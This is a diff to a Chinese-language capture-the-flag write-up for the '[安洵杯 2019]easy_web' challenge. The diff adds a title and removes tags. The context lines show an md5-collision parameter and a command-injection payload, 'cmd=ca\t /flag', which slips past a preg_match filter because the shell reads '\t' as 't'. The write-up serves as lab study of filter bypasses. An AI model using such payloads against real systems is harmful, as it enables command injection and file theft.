@@ -1,3 +1,4 @@
+# [安洵杯 2019]easy_web
 ![](<./img/Pasted image 20221118110609.png>)
 
 ---
@@ -90,5 +91,3 @@ a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d
 cmd=ca\t /flag
 ```
 原理大致就是，对于`preg_match`来说，`\t`被转义成了横向制表符，因而没有被过滤；而对于`sh`来说，`\t`被解析为`t`，因此`payload`依然被作为`cat /flag`执行
-
-#Web #md5 #PHP #bypass #shell #encoding
